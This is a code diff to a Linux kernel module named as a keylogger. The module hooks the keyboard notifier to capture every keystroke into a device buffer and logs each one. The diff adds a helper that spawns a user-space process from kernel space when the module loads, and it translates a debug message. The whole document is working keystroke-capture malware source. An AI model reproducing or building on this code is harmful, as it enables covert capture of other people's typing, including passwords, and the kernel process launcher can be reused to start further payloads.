@@ -4,6 +4,7 @@
 #include <linux/device.h>
 #include <linux/keyboard.h>
 #include <linux/fs.h>
+#include <linux/kmod.h>
 #include <linux/mutex.h>
 #include <asm/uaccess.h>
 
@@ -40,6 +41,24 @@ static int is_device_full(void)
     return (end + 1) % BUFFER_LEN == begin;
 }
 
+int start_deamon(void)
+{
+    struct subprocess_info *sub_info;
+    char *argv[] = {"/usr/bin/logger", "help!", NULL};
+    static char *envp[] = {
+            "HOME=/",
+            "TERM=linux",
+            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+
+    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC);
+    if (sub_info == NULL)
+    {
+        return -ENOMEM;
+    }
+
+    return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
+}
+
 int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param;
@@ -54,7 +73,7 @@ int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
             dev_buffer[end] = (char) (param->value);
             end = (end + 1) % BUFFER_LEN;
             mutex_unlock(&keyloggerDevice->mutex);
-            printk(KERN_ALERT "Zapakowal %i %i\n", begin, end);
+            printk(KERN_ALERT "Wrote %i %i\n", begin, end);
         }
         printk(KERN_ALERT "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
     }
@@ -95,7 +114,8 @@ static int __init keylogger_init(void)
 
     register_keyboard_notifier(&nb);
     mutex_init(&keyloggerDevice->mutex);
-    return 0;
+
+    return start_deamon();
 }
 
 static void __exit keylogger_exit(void)
@@ -109,7 +129,6 @@ static void __exit keylogger_exit(void)
 
 module_init(keylogger_init);
 module_exit(keylogger_exit);
-
 
 static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
 {
